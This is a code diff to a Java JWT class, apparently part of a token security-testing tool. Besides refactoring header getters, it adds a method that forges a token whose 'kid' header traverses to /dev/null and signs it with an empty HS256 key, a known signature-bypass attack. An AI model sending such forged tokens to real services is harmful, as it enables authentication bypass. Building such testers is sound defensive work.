@@ -115,22 +115,19 @@ public class Jwt {
     }
 
     public Optional<String> getJku() {
-        var jku = this.header.get("jku");
-        if (jku == null) {
-            return Optional.empty();
-        }
-        if (jku instanceof String s) {
-            return Optional.of(s);
-        }
-        return Optional.empty();
+        return this.getHeaderAsString("jku");
     }
 
-    public Optional<String> getJwk() {
-        var jwk = this.header.get("jwk");
-        if (jwk == null) {
+    public Optional<String> getKid() {
+        return this.getHeaderAsString("kid");
+    }
+
+    private Optional<String> getHeaderAsString(String key) {
+        var value = this.header.get(key);
+        if (value == null) {
             return Optional.empty();
         }
-        if (jwk instanceof String s) {
+        if (value instanceof String s) {
             return Optional.of(s);
         }
         return Optional.empty();
@@ -166,6 +163,13 @@ public class Jwt {
 
     public Jwt withEmptyPassword() {
         return Jwt.newBuilder(this).withHeader("alg", "HS256").withHS256Signature("").build();
+    }
+
+    public Jwt withKidPointingToDevNull() {
+        return Jwt.newBuilder(this)
+                .withHeader("kid", "../../../../../../../../../../../dev/null")
+                .build()
+                .withEmptyPassword();
     }
 
     public Jwt withInvalidEcdsa() {
@@ -260,11 +264,6 @@ public class Jwt {
 
         public Builder withHeader(String key, Object value) {
             this.header.put(key, value);
-            return this;
-        }
-
-        public Builder removeHeader(String key) {
-            this.header.remove(key);
             return this;
         }
 
